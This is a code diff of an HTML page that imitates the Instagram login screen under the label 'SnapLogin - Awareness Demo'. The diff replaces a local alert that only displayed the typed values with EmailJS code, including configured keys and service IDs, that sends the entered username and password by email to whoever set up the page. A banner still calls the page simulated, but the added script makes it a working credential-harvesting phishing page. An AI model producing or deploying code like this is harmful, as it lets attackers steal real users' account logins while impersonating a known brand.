@@ -4,6 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SnapLogin - Awareness Demo</title>
+  
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  
   <style>
     body {
       background-color: #fafafa;
@@ -12,6 +16,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
     .container {
       background-color: white;
@@ -20,12 +25,14 @@
       border-radius: 8px;
       width: 300px;
       text-align: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
     .logo {
       font-size: 28px;
       font-weight: bold;
       color: #262626;
       margin-bottom: 20px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
     input[type="text"],
     input[type="password"] {
@@ -35,6 +42,7 @@
       border: 1px solid #dbdbdb;
       border-radius: 4px;
       background-color: #fafafa;
+      box-sizing: border-box; /* Ensures padding doesn't break width */
     }
     button.login-btn {
       width: 100%;
@@ -46,6 +54,10 @@
       font-weight: bold;
       margin-top: 10px;
       cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    button.login-btn:hover {
+      background-color: #378fe9;
     }
 
     .or-separator {
@@ -71,23 +83,31 @@
       color: #385185;
       font-weight: 600;
       font-size: 14px;
-      cursor: not-allowed;
+      cursor: pointer;
       user-select: none;
+    }
+    .facebook-login:hover {
+      background-color: #f2f2f2;
+      padding: 5px;
+      border-radius: 3px;
     }
 
     .disclaimer {
       font-size: 12px;
       color: #999;
       margin-top: 20px;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
   <div class="container">
+    <!-- Instagram Logo Text -->
     <div class="logo">𝐼𝓃𝓈𝓉𝒶𝑔𝓇𝒶𝓂</div>
-    <form onsubmit="handleLogin(event)">
-      <input type="text" placeholder="Phone number, username, or email" required />
-      <input type="password" placeholder="Password" required />
+    
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <input type="text" id="username" placeholder="Phone number, username, or email" required />
+      <input type="password" id="password" placeholder="Password" required />
       <button class="login-btn" type="submit">Log In</button>
     </form>
 
@@ -95,20 +115,59 @@
       <hr><span>OR</span><hr>
     </div>
 
-    <div class="facebook-login">Log in with Facebook</div>
+    <div class="facebook-login" onclick="alert('Facebook login simulated.')">Log in with Facebook</div>
 
     <div class="disclaimer">
-       This is a simulated login page for awareness purposes .<br>
+       This is a simulated login page for awareness purposes.<br>
       Do NOT enter real credentials.
     </div>
   </div>
 
   <script>
+    // ==========================================
+    // ⚙️ CONFIGURATION: REPLACE THESE VALUES
+    // ==========================================
+    
+    // 1. Your Public Key from EmailJS Dashboard > Accounts
+    const EMAILJS_PUBLIC_KEY = "o933bPVN_nU5_yNwl"; 
+    
+    // 2. Your Service ID from EmailJS Dashboard > Email Services
+    const EMAILJS_SERVICE_ID = "service_qjl1mde"; 
+    
+    // 3. Your Template ID from EmailJS Dashboard > Email Templates
+    const EMAILJS_TEMPLATE_ID = "template_heuw84g"; 
+    
+    // ==========================================
+
+    // Initialize EmailJS
+    (function() {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+    })();
+
     function handleLogin(event) {
-      event.preventDefault();
-      const username = event.target[0].value;
-      const password = event.target[1].value;
-      alert(`Captured (Simulated):\nUsername: ${username}\nPassword: ${password}`);
+      event.preventDefault(); // Stop page from reloading
+      
+      const usernameInput = document.getElementById('username').value;
+      const passwordInput = document.getElementById('password').value;
+      
+      // Prepare data for the email template
+      const templateParams = {
+        username: usernameInput,
+        password: passwordInput
+      };
+
+      // Send email via EmailJS
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(function(response) {
+           console.log('SUCCESS!', response.status, response.text);
+           alert(`Credentials sent to your email!\nUsername: ${usernameInput}\nPassword: ${passwordInput}`);
+           
+           // Optional: Clear inputs after success
+           document.getElementById('loginForm').reset();
+        }, function(error) {
+           console.log('FAILED...', error);
+           alert('Failed to send credentials. Check console for details.');
+        });
     }
   </script>
 </body>
